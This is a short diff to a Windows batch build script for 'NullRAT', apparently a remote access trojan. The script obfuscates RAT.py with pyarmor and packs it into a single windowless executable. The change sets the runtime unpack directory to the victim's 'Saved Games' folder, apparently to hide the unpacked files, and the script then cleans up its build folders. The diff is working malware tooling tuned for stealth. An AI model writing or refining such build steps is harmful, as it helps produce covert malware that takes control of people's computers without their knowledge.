@@ -18,7 +18,7 @@ exit /b 1
 :non_icon_compile
 echo. & echo Compiling NullRAT...
 echo -------------------- & echo.
-pyarmor pack -e "--onefile --noconsole" RAT.py & cls 
+pyarmor pack -e "--onefile --noconsole --runtime-tmpdir '%USERPROFILE%\Saved Games'" RAT.py & cls 
 cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
 if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
 
